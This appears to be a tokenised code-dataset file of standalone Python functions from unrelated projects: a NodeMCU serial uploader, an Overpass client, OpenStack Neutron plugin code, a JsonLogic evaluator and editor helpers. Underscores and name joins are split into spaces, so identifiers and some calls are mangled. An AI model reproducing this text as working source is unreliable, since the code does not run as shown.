def exchange ( self , output , timeout = None ) : self . writeln ( output ) self . port . flush ( ) return self . expect ( timeout = timeout or self . timeout )
def close ( self ) : try : if self . baud != self . start baud : self . set baudrate ( self . start baud ) self . port . flush ( ) self . clear buffers ( ) except serial . serialutil . Serial Exception : pass log . debug ( 'closing port' ) self . port . close ( )
def download file ( self , filename ) : res = self . exchange ( 'send("{filename}")' . format ( filename = filename ) ) if ( 'unexpected' in res ) or ( 'stdin' in res ) : log . error ( 'Unexpected error downloading file: %s' , res ) raise Exception ( 'Unexpected error downloading file' ) #tell device we are ready to receive self . write ( 'C' ) #we should get a NUL terminated filename to start with sent filename = self . expect ( NUL ) . strip ( ) log . info ( 'receiveing ' + sent filename ) #ACK to start download self . write ( ACK , True ) buf = '' data = '' chunk , buf = self . read chunk ( buf ) #read chunks until we get an empty which is the end while chunk != '' : self . write ( ACK , True ) data = data + chunk chunk , buf = self . read chunk ( buf ) return data
def read file ( self , filename , destination = '' ) : if not destination : destination = filename log . info ( 'Transferring %s to %s' , filename , destination ) data = self . download file ( filename ) # Just in case, the filename may contain folder, so create it if needed. log . info ( destination ) if not os . path . exists ( os . path . dirname ( destination ) ) : try : os . makedirs ( os . path . dirname ( destination ) ) except OS Error as e : # Guard against race condition if e . errno != errno . EEXIST : raise with open ( destination , 'w' ) as fil : fil . write ( data )
def write file ( self , path , destination = '' , verify = 'none' ) : filename = os . path . basename ( path ) if not destination : destination = filename log . info ( 'Transferring %s as %s' , path , destination ) self . writeln ( "recv()" ) res = self . expect ( 'C> ' ) if not res . endswith ( 'C> ' ) : log . error ( 'Error waiting for esp "%s"' , res ) raise Communication Timeout ( 'Error waiting for device to start receiving' , res ) log . debug ( 'sending destination filename "%s"' , destination ) self . write ( destination + '\x00' , True ) if not self . got ack ( ) : log . error ( 'did not ack destination filename' ) raise No Ack Exception ( 'Device did not ACK destination filename' ) content = from file ( path ) log . debug ( 'sending %d bytes in %s' , len ( content ) , filename ) pos = 0 chunk size = 128 while pos < len ( content ) : rest = len ( content ) - pos if rest > chunk size : rest = chunk size data = content [ pos : pos + rest ] if not self . write chunk ( data ) : resp = self . expect ( ) log . error ( 'Bad chunk response "%s" %s' , resp , hexify ( resp ) ) raise Bad Response Exception ( 'Bad chunk response' , ACK , resp ) pos += chunk size log . debug ( 'sending zero block' ) #zero size block self . write chunk ( '' ) if verify != 'none' : self . verify file ( path , destination , verify )
def exec file ( self , path ) : filename = os . path . basename ( path ) log . info ( 'Execute %s' , filename ) content = from file ( path ) . replace ( '\r' , '' ) . split ( '\n' ) res = '> ' for line in content : line = line . rstrip ( '\n' ) retlines = ( res + self . exchange ( line ) ) . splitlines ( ) # Log all but the last line res = retlines . pop ( ) for lin in retlines : log . info ( lin ) # last line log . info ( res )
def got ack ( self ) : log . debug ( 'waiting for ack' ) res = self . port . read ( 1 ) log . debug ( 'ack read %s' , hexify ( res ) ) return res == ACK
def read chunk ( self , buf ) : log . debug ( 'reading chunk' ) timeout before = self . port . timeout if SYSTEM != 'Windows' : # Checking for new data every 100us is fast enough if self . port . timeout != MINIMAL TIMEOUT : self . port . timeout = MINIMAL TIMEOUT end = time . time ( ) + timeout before while len ( buf ) < 130 and time . time ( ) <= end : buf = buf + self . port . read ( ) if buf [ 0 ] != BLOCK START or len ( buf ) < 130 : log . debug ( 'buffer binary: %s ' , hexify ( buf ) ) raise Exception ( 'Bad blocksize or start byte' ) if SYSTEM != 'Windows' : self . port . timeout = timeout before chunk size = ord ( buf [ 1 ] ) data = buf [ 2 : chunk size + 2 ] buf = buf [ 130 : ] return ( data , buf )
def file list ( self ) : log . info ( 'Listing files' ) res = self . exchange ( LIST FILES ) res = res . split ( '\r\n' ) # skip first and last lines res = res [ 1 : - 1 ] files = [ ] for line in res : files . append ( line . split ( '\t' ) ) return files
def file do ( self , filename ) : log . info ( 'Executing ' + filename ) res = self . exchange ( 'dofile("' + filename + '")' ) log . info ( res ) return res
def file print ( self , filename ) : log . info ( 'Printing ' + filename ) res = self . exchange ( PRINT FILE . format ( filename = filename ) ) log . info ( res ) return res
def node heap ( self ) : log . info ( 'Heap' ) res = self . exchange ( 'print(node.heap())' ) log . info ( res ) return int ( res . split ( '\r\n' ) [ 1 ] )
def file compile ( self , path ) : log . info ( 'Compile ' + path ) cmd = 'node.compile("%s")' % path res = self . exchange ( cmd ) log . info ( res ) return res
def file remove ( self , path ) : log . info ( 'Remove ' + path ) cmd = 'file.remove("%s")' % path res = self . exchange ( cmd ) log . info ( res ) return res
def backup ( self , path ) : log . info ( 'Backing up in ' + path ) # List file to backup files = self . file list ( ) # then download each of then self . prepare ( ) for f in files : self . read file ( f [ 0 ] , os . path . join ( path , f [ 0 ] ) )
def operation list ( uploader ) : files = uploader . file list ( ) for f in files : log . info ( "{file:30s} {size}" . format ( file = f [ 0 ] , size = f [ 1 ] ) )
def main func ( ) : parser = argparse . Argument Parser ( description = 'Node MCU Lua file uploader' , prog = 'nodemcu-uploader' ) parser . add argument ( '--verbose' , help = 'verbose output' , action = 'store true' , default = False ) parser . add argument ( '--version' , help = 'prints the version and exists' , action = 'version' , version = '%(prog)s {version} (serial {serialversion})' . format ( version = version , serialversion = serialversion ) ) parser . add argument ( '--port' , '-p' , help = 'Serial port device' , default = Uploader . PORT ) parser . add argument ( '--baud' , '-b' , help = 'Serial port baudrate' , type = arg auto int , default = Uploader . BAUD ) parser . add argument ( '--start baud' , '-B' , help = 'Initial Serial port baudrate' , type = arg auto int , default = Uploader . START BAUD ) parser . add argument ( '--timeout' , '-t' , help = 'Timeout for operations' , type = arg auto int , default = Uploader . TIMEOUT ) parser . add argument ( '--autobaud time' , '-a' , help = 'Duration of the autobaud timer' , type = float , default = Uploader . AUTOBAUD TIME , ) subparsers = parser . add subparsers ( dest = 'operation' , help = 'Run nodemcu-uploader {command} -h for additional help' ) backup parser = subparsers . add parser ( 'backup' , help = 'Backup all the files on the nodemcu board' ) backup parser . add argument ( 'path' , help = 'Folder where to store the backup' ) upload parser = subparsers . add parser ( 'upload' , help = 'Path to one or more files to be uploaded. Destination name will be the same as the file name.' ) upload parser . add argument ( 'filename' , nargs = '+' , help = 'Lua file to upload. Use colon to give alternate destination.' ) upload parser . add argument ( '--compile' , '-c' , help = 'If file should be uploaded as compiled' , action = 'store true' , default = False ) upload parser . add argument ( '--verify' , '-v' , help = 'To verify the uploaded data.' , action = 'store' , nargs = '?' , choices = [ 'none' , 'raw' , 'sha1' ] , default = 'none' ) upload parser . add argument ( '--dofile' , '-e' , help = 'If file should be run after upload.' , action = 'store true' , default = False ) upload parser . add argument ( '--restart' , '-r' , help = 'If esp should be restarted' , action = 'store true' , default = False ) exec parser = subparsers . add parser ( 'exec' , help = 'Path to one or more files to be executed line by line.' ) exec parser . add argument ( 'filename' , nargs = '+' , help = 'Lua file to execute.' ) download parser = subparsers . add parser ( 'download' , help = 'Path to one or more files to be downloaded. Destination name will be the same as the file name.' ) download parser . add argument ( 'filename' , nargs = '+' , help = 'Lua file to download. Use colon to give alternate destination.' ) file parser = subparsers . add parser ( 'file' , help = 'File functions' ) file parser . add argument ( 'cmd' , choices = ( 'list' , 'do' , 'format' , 'remove' , 'print' ) , help = "list=list files, do=dofile given path, format=formate file area, remove=remove given path" ) file parser . add argument ( 'filename' , nargs = '*' , help = 'path for cmd' ) node parse = subparsers . add parser ( 'node' , help = 'Node functions' ) node parse . add argument ( 'ncmd' , choices = ( 'heap' , 'restart' ) , help = "heap=print heap memory, restart=restart nodemcu" ) subparsers . add parser ( 'terminal' , help = 'Run py Serials miniterm' ) args = parser . parse args ( ) default level = logging . INFO if args . verbose : default level = logging . DEBUG #formatter = logging.Formatter('%(message)s') logging . basic Config ( level = default level , format = '%(message)s' ) if args . operation == 'terminal' : #uploader can not claim the port terminal ( args . port , str ( args . start baud ) ) return # let uploader user the default (short) timeout for establishing connection uploader = Uploader ( args . port , args . baud , start baud = args . start baud , autobaud time = args . autobaud time ) # and reset the timeout (if we have the uploader&timeout) if args . timeout : uploader . set timeout ( args . timeout ) if args . operation == 'upload' : operation upload ( uploader , args . filename , args . verify , args . compile , args . dofile , args . restart ) elif args . operation == 'download' : operation download ( uploader , args . filename ) elif args . operation == 'exec' : sources = args . filename for path in sources : uploader . exec file ( path ) elif args . operation == 'file' : operation file ( uploader , args . cmd , args . filename ) elif args . operation == 'node' : if args . ncmd == 'heap' : uploader . node heap ( ) elif args . ncmd == 'restart' : uploader . node restart ( ) elif args . operation == 'backup' : uploader . backup ( args . path ) #no uploader related commands after this point uploader . close ( )
def localize ( dt ) : try : tz = dt . tzinfo return tz . localize ( dt . replace ( tzinfo = None ) ) except Attribute Error : return dt
def daily at ( cls , at , target ) : daily = datetime . timedelta ( days = 1 ) # convert when to the next datetime matching this time when = datetime . datetime . combine ( datetime . date . today ( ) , at ) if when < now ( ) : when += daily return cls . at time ( cls . localize ( when ) , daily , target )
def get nearest year for day ( day ) : now = time . gmtime ( ) result = now . tm year # if the day is far greater than today, it must be from last year if day - now . tm yday > 365 // 2 : result -= 1 # if the day is far less than today, it must be for next year. if now . tm yday - day > 365 // 2 : result += 1 return result
def get ( self , query , responseformat = "geojson" , verbosity = "body" , build = True ) : # Construct full Overpass query if build : full query = self . construct ql query ( query , responseformat = responseformat , verbosity = verbosity ) else : full query = query if self . debug : logging . get Logger ( ) . info ( query ) # Get the response from Overpass r = self . get from overpass ( full query ) content type = r . headers . get ( "content-type" ) if self . debug : print ( content type ) if content type == "text/csv" : result = [ ] reader = csv . reader ( String IO ( r . text ) , delimiter = "\t" ) for row in reader : result . append ( row ) return result elif content type in ( "text/xml" , "application/xml" , "application/osm3s+xml" ) : return r . text elif content type == "application/json" : response = json . loads ( r . text ) if not build : return response # Check for valid answer from Overpass. # A valid answer contains an 'elements' key at the root level. if "elements" not in response : raise Unknown Overpass Error ( "Received an invalid answer from Overpass." ) # If there is a 'remark' key, it spells trouble. overpass remark = response . get ( "remark" , None ) if overpass remark and overpass remark . startswith ( "runtime error" ) : raise Server Runtime Error ( overpass remark ) if responseformat is not "geojson" : return response # construct geojson return self . as geojson ( response [ "elements" ] )
def get resources ( cls ) : plugin = directory . get plugin ( ) controller = Segment Allocation Ranges Controller ( plugin ) return [ extensions . Resource Extension ( Segment allocation ranges . get alias ( ) , controller ) ]
def get resources ( cls ) : plugin = directory . get plugin ( ) controller = IP Availability Controller ( plugin ) return [ extensions . Resource Extension ( Ip availability . get alias ( ) , controller ) ]
def update ip address ( context , id , ip address ) : LOG . info ( "update ip address %s for tenant %s" % ( id , context . tenant id ) ) ports = [ ] if 'ip address' not in ip address : raise n exc . Bad Request ( resource = "ip addresses" , msg = "Invalid request body." ) with context . session . begin ( ) : db address = db api . ip address find ( context , id = id , scope = db api . ONE ) if not db address : raise q exc . Ip Address Not Found ( addr id = id ) iptype = db address . address type if iptype == ip types . FIXED and not CONF . QUARK . ipaddr allow fixed ip : raise n exc . Bad Request ( resource = "ip addresses" , msg = "Fixed ips cannot be updated using this interface." ) reset = ip address [ 'ip address' ] . get ( 'reset allocation time' , False ) if reset and db address [ 'deallocated' ] == 1 : if context . is admin : LOG . info ( "IP's deallocated time being manually reset" ) db address [ 'deallocated at' ] = get deallocated override ( ) else : msg = "Modification of reset allocation time requires admin" raise webob . exc . HTTP Forbidden ( detail = msg ) port ids = ip address [ 'ip address' ] . get ( 'port ids' , None ) if port ids is not None and not port ids : raise n exc . Bad Request ( resource = "ip addresses" , msg = "Cannot be updated with empty port id list" ) if iptype == ip types . SHARED : has owner = db address . has any shared owner ( ) if port ids : if iptype == ip types . FIXED and len ( port ids ) > 1 : raise n exc . Bad Request ( resource = "ip addresses" , msg = "Fixed ips cannot be updated with more than one port." ) raise if shared and enabled ( ip address , db address ) ports = db api . port find ( context , tenant id = context . tenant id , id = port ids , scope = db api . ALL ) # NOTE(name): could be considered inefficient because we're # converting to a list to check length. Maybe revisit if len ( ports ) != len ( port ids ) : raise n exc . Port Not Found ( port id = port ids ) validate and fetch segment ( ports , db address [ "network id" ] ) validate port ip quotas ( context , db address . network id , ports ) if iptype == ip types . SHARED and has owner : for assoc in db address . associations : pid = assoc . port id if pid not in port ids and 'none' != assoc . service : raise q exc . Port Requires Disassociation ( ) LOG . info ( "Updating IP address, %s, to only be used by the" "following ports:  %s" % ( db address . address readable , [ p . id for p in ports ] ) ) new address = db api . update port associations for ip ( context , ports , db address ) elif iptype == ip types . SHARED and has owner : raise q exc . Port Requires Disassociation ( ) elif 'deallocated' in ip address [ 'ip address' ] and context . is admin : # Verify no port associations if len ( db address . associations ) != 0 : exc msg = ( "IP %s cannot be deallocated or allocated while" " still associated with ports: %s" % ( db address [ 'address readable' ] , db address . associations ) ) raise q exc . Action Not Authorized ( msg = exc msg ) # NOTE: If an admin, allow a user to set deallocated to false # in order to reserve a deallocated IP. Alternatively, allow them # reverse that choice if a mistake was made. if ip address [ 'ip address' ] [ 'deallocated' ] == 'False' : db address [ 'deallocated' ] = False else : db address [ 'deallocated' ] = True return v . make ip dict ( db address , context . is admin ) else : ipam driver . deallocate ip address ( context , db address ) return v . make ip dict ( db address , context . is admin ) return v . make ip dict ( new address , context . is admin )
def get resources ( cls ) : ip controller = Ip Addresses Controller ( directory . get plugin ( ) ) ip port controller = Ip Address Port Controller ( directory . get plugin ( ) ) resources = [ ] resources . append ( extensions . Resource Extension ( Ip addresses . get alias ( ) , ip controller ) ) parent = { 'collection name' : 'ip addresses' , 'member name' : 'ip address' } resources . append ( extensions . Resource Extension ( 'ports' , ip port controller , parent = parent ) ) return resources
def get resources ( cls ) : plugin = directory . get plugin ( ) controller = Mac Address Ranges Controller ( plugin ) return [ extensions . Resource Extension ( Mac address ranges . get alias ( ) , controller ) ]
def update security group rule ( context , id , security group rule ) : LOG . info ( "update security group rule for tenant %s" % ( context . tenant id ) ) new rule = security group rule [ "security group rule" ] # Only allow updatable fields new rule = filter update security group rule ( new rule ) with context . session . begin ( ) : rule = db api . security group rule find ( context , id = id , scope = db api . ONE ) if not rule : raise sg ext . Security Group Rule Not Found ( id = id ) db rule = db api . security group rule update ( context , rule , * * new rule ) group id = db rule . group id group = db api . security group find ( context , id = group id , scope = db api . ONE ) if not group : raise sg ext . Security Group Not Found ( id = group id ) if group : perform async update rule ( context , group id , group , rule . id , RULE UPDATE ) return v . make security group rule dict ( db rule )
def get public net id ( self ) : for id , net params in self . strategy . iteritems ( ) : if id == CONF . QUARK . public net id : return id return None
def add job to context ( context , job id ) : db job = db api . async transaction find ( context , id = job id , scope = db api . ONE ) if not db job : return context . async job = { "job" : v . make job dict ( db job ) }
def get resources ( cls ) : plugin = directory . get plugin ( ) controller = IP Policies Controller ( plugin ) return [ extensions . Resource Extension ( Ip policies . get alias ( ) , controller ) ]
def add default tz bindings ( self , context , switch , network id ) : default tz = CONF . NVP . default tz # If there is no default tz specified it's pointless to try # and add any additional default tz bindings. if not default tz : LOG . warn ( "additional default tz types specified, " "but no default tz. Skipping " " add default tz bindings()." ) return # This should never be called without a neutron network uuid, # we require it to bind some segment allocations. if not network id : LOG . warn ( "neutron network id not specified, skipping " " add default tz bindings()" ) return for net type in CONF . NVP . additional default tz types : if net type in TZ BINDINGS : binding = TZ BINDINGS [ net type ] binding . add ( context , switch , default tz , network id ) else : LOG . warn ( "Unknown default tz type %s" % ( net type ) )
def remove default tz bindings ( self , context , network id ) : default tz = CONF . NVP . default tz if not default tz : LOG . warn ( "additional default tz types specified, " "but no default tz. Skipping " " remove default tz bindings()." ) return if not network id : LOG . warn ( "neutron network id not specified, skipping " " remove default tz bindings()" ) return for net type in CONF . NVP . additional default tz types : if net type in TZ BINDINGS : binding = TZ BINDINGS [ net type ] binding . remove ( context , default tz , network id ) else : LOG . warn ( "Unknown default tz type %s" % ( net type ) )
def discover via entrypoints ( self ) : emgr = extension . Extension Manager ( PLUGIN EP , invoke on load = False ) return ( ( ext . name , ext . plugin ) for ext in emgr )
def serve rpc ( self ) : if cfg . CONF . QUARK ASYNC . rpc workers < 1 : cfg . CONF . set override ( 'rpc workers' , 1 , "QUARK ASYNC" ) try : rpc = service . Rpc Worker ( self . plugins ) launcher = common service . Process Launcher ( CONF , wait interval = 1.0 ) launcher . launch service ( rpc , workers = CONF . QUARK ASYNC . rpc workers ) return launcher except Exception : with excutils . save and reraise exception ( ) : LOG . exception ( LE ( 'Unrecoverable error: please check log for ' 'details.' ) )
def get resources ( cls ) : plural mappings = resource helper . build plural mappings ( { } , RESOURCE ATTRIBUTE MAP ) # attr.PLURALS.update(plural mappings) return resource helper . build resource info ( plural mappings , RESOURCE ATTRIBUTE MAP , None , register quota = True )
def check collisions ( self , new range , existing ranges ) : def contains ( num , r1 ) : return ( num >= r1 [ 0 ] and num <= r1 [ 1 ] ) def is overlap ( r1 , r2 ) : return ( contains ( r1 [ 0 ] , r2 ) or contains ( r1 [ 1 ] , r2 ) or contains ( r2 [ 0 ] , r1 ) or contains ( r2 [ 1 ] , r1 ) ) for existing range in existing ranges : if is overlap ( new range , existing range ) : return True return False
def delete locks ( context , network ids , addresses ) : addresses no longer null routed = find addresses to be unlocked ( context , network ids , addresses ) LOG . info ( "Deleting %s lock holders on IP Address with ids: %s" , len ( addresses no longer null routed ) , [ addr . id for addr in addresses no longer null routed ] ) for address in addresses no longer null routed : lock holder = None try : lock holder = db api . lock holder find ( context , lock id = address . lock id , name = LOCK NAME , scope = db api . ONE ) if lock holder : db api . lock holder delete ( context , address , lock holder ) except Exception : LOG . exception ( "Failed to delete lock holder %s" , lock holder ) continue context . session . flush ( )
def set ( self , model , value ) : self . validate ( value ) self . pop ( model ) value = self . serialize ( value ) model . tags . append ( value )
def get ( self , model ) : for tag in model . tags : if self . is tag ( tag ) : value = self . deserialize ( tag ) try : self . validate ( value ) return value except Tag Validation Error : continue return None
def pop ( self , model ) : tags = [ ] # collect any exsiting tags with matching prefix for tag in model . tags : if self . is tag ( tag ) : tags . append ( tag ) # remove collected tags from model if tags : for tag in tags : model . tags . remove ( tag ) return tags
def pop ( self , model ) : tags = self . pop ( model ) if tags : for tag in tags : value = self . deserialize ( tag ) try : self . validate ( value ) return value except Tag Validation Error : continue
def has tag ( self , model ) : for tag in model . tags : if self . is tag ( tag ) : return True return False
def set all ( self , model , * * tags ) : for name , tag in self . tags . items ( ) : if name in tags : value = tags . pop ( name ) if value : try : tag . set ( model , value ) except Tag Validation Error as e : raise n exc . Bad Request ( resource = "tags" , msg = "%s" % ( e . message ) )
def serialize rules ( self , rules ) : # TODO(mdietz): If/when we support other rule types, this comment #               will have to be revised. # Action and direction are static, for now. The implementation may # support 'deny' and 'egress' respectively in the future. We allow # the direction to be set to something else, technically, but current # plugin level call actually raises. It's supported here for unit # test purposes at this time serialized = [ ] for rule in rules : direction = rule [ "direction" ] source = '' destination = '' if rule . get ( "remote ip prefix" ) : prefix = rule [ "remote ip prefix" ] if direction == "ingress" : source = self . convert remote network ( prefix ) else : if ( Capabilities . EGRESS not in CONF . QUARK . environment capabilities ) : raise q exc . Egress Security Group Rules Not Enabled ( ) else : destination = self . convert remote network ( prefix ) optional fields = { } # NOTE(mdietz): this will expand as we add more protocols protocol map = protocols . PROTOCOL MAP [ rule [ "ethertype" ] ] if rule [ "protocol" ] == protocol map [ "icmp" ] : optional fields [ "icmp type" ] = rule [ "port range min" ] optional fields [ "icmp code" ] = rule [ "port range max" ] else : optional fields [ "port start" ] = rule [ "port range min" ] optional fields [ "port end" ] = rule [ "port range max" ] payload = { "ethertype" : rule [ "ethertype" ] , "protocol" : rule [ "protocol" ] , "source network" : source , "destination network" : destination , "action" : "allow" , "direction" : direction } payload . update ( optional fields ) serialized . append ( payload ) return serialized
def apply rules ( self , device id , mac address , rules ) : LOG . info ( "Applying security group rules for device %s with MAC %s" % ( device id , mac address ) ) rule dict = { SECURITY GROUP RULE KEY : rules } redis key = self . vif key ( device id , mac address ) # TODO(mdietz): Pipeline these. Requires some rewriting self . set field ( redis key , SECURITY GROUP HASH ATTR , rule dict ) self . set field raw ( redis key , SECURITY GROUP ACK , False )
def update group states for vifs ( self , vifs , ack ) : vif keys = [ self . vif key ( vif . device id , vif . mac address ) for vif in vifs ] self . set fields ( vif keys , SECURITY GROUP ACK , ack )
def get resources ( cls ) : job controller = Jobs Controller ( directory . get plugin ( ) ) resources = [ ] resources . append ( extensions . Resource Extension ( Jobs . get alias ( ) , job controller ) ) return resources
def filter factory ( global conf , * * local conf ) : conf = global conf . copy ( ) conf . update ( local conf ) def wrapper ( app ) : return Response Async Id Adder ( app , conf ) return wrapper
def get interfaces ( self ) : LOG . debug ( "Getting interfaces from Xapi" ) with self . sessioned ( ) as session : instances = self . get instances ( session ) recs = session . xenapi . VIF . get all records ( ) interfaces = set ( ) for vif ref , rec in recs . iteritems ( ) : vm = instances . get ( rec [ "VM" ] ) if not vm : continue device id = vm . uuid interfaces . add ( VIF ( device id , rec , vif ref ) ) return interfaces
def main ( notify , hour , minute ) : # Read the config file and get the admin context config opts = [ '--config-file' , '/etc/neutron/neutron.conf' ] config . init ( config opts ) # Have to load the billing module  after  config is parsed so # that we get the right network strategy network strategy . STRATEGY . load ( ) billing . PUBLIC NETWORK ID = network strategy . STRATEGY . get public net id ( ) config . setup logging ( ) context = neutron context . get admin context ( ) # A query to get all IP Address objects from the db query = context . session . query ( models . IP Address ) ( period start , period end ) = billing . calc periods ( hour , minute ) full day ips = billing . build full day ips ( query , period start , period end ) partial day ips = billing . build partial day ips ( query , period start , period end ) if notify : # '==================== Full Day =============================' for ipaddress in full day ips : click . echo ( 'start: {}, end: {}' . format ( period start , period end ) ) payload = billing . build payload ( ipaddress , billing . IP EXISTS , start time = period start , end time = period end ) billing . do notify ( context , billing . IP EXISTS , payload ) # '==================== Part Day =============================' for ipaddress in partial day ips : click . echo ( 'start: {}, end: {}' . format ( period start , period end ) ) payload = billing . build payload ( ipaddress , billing . IP EXISTS , start time = ipaddress . allocated at , end time = period end ) billing . do notify ( context , billing . IP EXISTS , payload ) else : click . echo ( 'Case 1 ({}):\n' . format ( len ( full day ips ) ) ) for ipaddress in full day ips : pp ( billing . build payload ( ipaddress , billing . IP EXISTS , start time = period start , end time = period end ) ) click . echo ( '\n===============================================\n' ) click . echo ( 'Case 2 ({}):\n' . format ( len ( partial day ips ) ) ) for ipaddress in partial day ips : pp ( billing . build payload ( ipaddress , billing . IP EXISTS , start time = ipaddress . allocated at , end time = period end ) )
def start rpc listeners ( self ) : self . setup rpc ( ) if not self . endpoints : return [ ] self . conn = n rpc . create connection ( ) self . conn . create consumer ( self . topic , self . endpoints , fanout = False ) return self . conn . consume in threads ( )
def context ( self ) : if not self . context : self . context = context . get admin context ( ) return self . context
def update sg ( self , context , sg , rule id , action ) : db sg = db api . security group find ( context , id = sg , scope = db api . ONE ) if not db sg : return None with context . session . begin ( ) : job body = dict ( action = "%s sg rule %s" % ( action , rule id ) , resource id = rule id , tenant id = db sg [ 'tenant id' ] ) job body = dict ( job = job body ) job = job api . create job ( context . elevated ( ) , job body ) rpc client = Quark SG Async Producer Client ( ) try : rpc client . populate subtasks ( context , sg , job [ 'id' ] ) except om exc . Messaging Timeout : LOG . error ( "Failed to create subtasks. Rabbit running?" ) return None return { "job id" : job [ 'id' ] }
def populate subtasks ( self , context , sg , parent job id ) : db sg = db api . security group find ( context , id = sg , scope = db api . ONE ) if not db sg : return None ports = db api . sg gather associated ports ( context , db sg ) if len ( ports ) == 0 : return { "ports" : 0 } for port in ports : job body = dict ( action = "update port %s" % port [ 'id' ] , tenant id = db sg [ 'tenant id' ] , resource id = port [ 'id' ] , parent id = parent job id ) job body = dict ( job = job body ) job = job api . create job ( context . elevated ( ) , job body ) rpc consumer = Quark SG Async Consumer Client ( ) try : rpc consumer . update port ( context , port [ 'id' ] , job [ 'id' ] ) except om exc . Messaging Timeout : # TODO(roaet): Not too sure what can be done here other than # updating the job as a failure? LOG . error ( "Failed to update port. Rabbit running?" ) return None
def update ports for sg ( self , context , portid , jobid ) : port = db api . port find ( context , id = portid , scope = db api . ONE ) if not port : LOG . warning ( "Port not found" ) return net driver = port api . get net driver ( port . network , port = port ) base net driver = port api . get net driver ( port . network ) sg list = [ sg for sg in port . security groups ] success = False error = None retries = 3 retry delay = 2 for retry in xrange ( retries ) : try : net driver . update port ( context , port id = port [ "backend key" ] , mac address = port [ "mac address" ] , device id = port [ "device id" ] , base net driver = base net driver , security groups = sg list ) success = True error = None break except Exception as error : LOG . warning ( "Could not connect to redis, but retrying soon" ) time . sleep ( retry delay ) status str = "" if not success : status str = "Port %s update failed after %d tries. Error: %s" % ( portid , retries , error ) update body = dict ( completed = True , status = status str ) update body = dict ( job = update body ) job api . update job ( context . elevated ( ) , jobid , update body )
def segment allocation find ( context , lock mode = False , * * filters ) : range ids = filters . pop ( "segment allocation range ids" , None ) query = context . session . query ( models . Segment Allocation ) if lock mode : query = query . with lockmode ( "update" ) query = query . filter by ( * * filters ) # Optionally filter by given list of range ids if range ids : query . filter ( models . Segment Allocation . segment allocation range id . in ( range ids ) ) return query
def get resources ( cls ) : controller = Routes Controller ( directory . get plugin ( ) ) return [ extensions . Resource Extension ( Routes . get alias ( ) , controller ) ]
def if ( * args ) : for i in range ( 0 , len ( args ) - 1 , 2 ) : if args [ i ] : return args [ i + 1 ] if len ( args ) % 2 : return args [ - 1 ] else : return None
def soft equals ( a , b ) : if isinstance ( a , str ) or isinstance ( b , str ) : return str ( a ) == str ( b ) if isinstance ( a , bool ) or isinstance ( b , bool ) : return bool ( a ) is bool ( b ) return a == b
def hard equals ( a , b ) : if type ( a ) != type ( b ) : return False return a == b
def minus ( * args ) : if len ( args ) == 1 : return - to numeric ( args [ 0 ] ) return to numeric ( args [ 0 ] ) - to numeric ( args [ 1 ] )
def merge ( * args ) : ret = [ ] for arg in args : if isinstance ( arg , list ) or isinstance ( arg , tuple ) : ret += list ( arg ) else : ret . append ( arg ) return ret
def get var ( data , var name , not found = None ) : try : for key in str ( var name ) . split ( '.' ) : try : data = data [ key ] except Type Error : data = data [ int ( key ) ] except ( Key Error , Type Error , Value Error ) : return not found else : return data
def missing ( data , * args ) : not found = object ( ) if args and isinstance ( args [ 0 ] , list ) : args = args [ 0 ] ret = [ ] for arg in args : if get var ( data , arg , not found ) is not found : ret . append ( arg ) return ret
def missing some ( data , min required , args ) : if min required < 1 : return [ ] found = 0 not found = object ( ) ret = [ ] for arg in args : if get var ( data , arg , not found ) is not found : ret . append ( arg ) else : found += 1 if found >= min required : return [ ] return ret
def json Logic ( tests , data = None ) : # You've recursed to a primitive, stop! if tests is None or not isinstance ( tests , dict ) : return tests data = data or { } operator = list ( tests . keys ( ) ) [ 0 ] values = tests [ operator ] # Easy syntax for unary operators, like {"var": "x"} instead of strict # {"var": ["x"]} if not isinstance ( values , list ) and not isinstance ( values , tuple ) : values = [ values ] # Recursion! values = [ json Logic ( val , data ) for val in values ] if operator == 'var' : return get var ( data , * values ) if operator == 'missing' : return missing ( data , * values ) if operator == 'missing some' : return missing some ( data , * values ) if operator not in operations : raise Value Error ( "Unrecognized operation %s" % operator ) return operations [ operator ] ( * values )
def unindent ( self ) : if self . tab always indent : cursor = self . editor . text Cursor ( ) if not cursor . has Selection ( ) : cursor . select ( cursor . Line Under Cursor ) self . unindent selection ( cursor ) else : super ( Py Indenter Mode , self ) . unindent ( )
def handle indent between paren ( self , column , line , parent impl , tc ) : pre , post = parent impl next char = self . get next char ( tc ) prev char = self . get prev char ( tc ) prev open = prev char in [ '[' , '(' , '{' ] next close = next char in [ ']' , ')' , '}' ] ( open line , open symbol col ) , ( close line , close col ) = self . get paren pos ( tc , column ) open line txt = self . helper . line text ( open line ) open line indent = len ( open line txt ) - len ( open line txt . lstrip ( ) ) if prev open : post = ( open line indent + self . editor . tab length ) * ' ' elif next close and prev char != ',' : post = open line indent * ' ' elif tc . block ( ) . block Number ( ) == open line : post = open symbol col * ' ' # adapt indent if cursor on closing line and next line have same # indent -> PEP8 compliance if close line and close col : txt = self . helper . line text ( close line ) bn = tc . block ( ) . block Number ( ) flg = bn == close line next indent = self . helper . line indent ( bn + 1 ) * ' ' if flg and txt . strip ( ) . endswith ( ':' ) and next indent == post : # | look at how the previous line ( ``':'):`` ) was # over-indented, this is actually what we are trying to # achieve here post += self . editor . tab length * ' ' # breaking string if next char in [ '"' , "'" ] : tc . move Position ( tc . Left ) is string = self . helper . is comment or string ( tc , formats = [ 'string' ] ) if next char in [ '"' , "'" ] : tc . move Position ( tc . Right ) if is string : trav = Q Text Cursor ( tc ) while self . helper . is comment or string ( trav , formats = [ 'string' ] ) : trav . move Position ( trav . Left ) trav . move Position ( trav . Right ) symbol = '%s' % self . get next char ( trav ) pre += symbol post += symbol return pre , post
def at block start ( tc , line ) : if tc . at Block Start ( ) : return True column = tc . column Number ( ) indentation = len ( line ) - len ( line . lstrip ( ) ) return column <= indentation
def update terminal colors ( self ) : self . color scheme = self . create color scheme ( background = self . syntax highlighter . color scheme . background , foreground = self . syntax highlighter . color scheme . formats [ 'normal' ] . foreground ( ) . color ( ) )
def setup actions ( self ) : self . action Open . triggered . connect ( self . on open ) self . action New . triggered . connect ( self . on new ) self . action Save . triggered . connect ( self . on save ) self . action Save as . triggered . connect ( self . on save as ) self . action Quit . triggered . connect ( Qt Widgets . Q Application . instance ( ) . quit ) self . tab Widget . current changed . connect ( self . on current tab changed ) self . tab Widget . last tab closed . connect ( self . on last tab closed ) self . action About . triggered . connect ( self . on about ) self . action Run . triggered . connect ( self . on run ) self . interactive Console . process finished . connect ( self . on process finished ) self . action Configure run . triggered . connect ( self . on configure run )
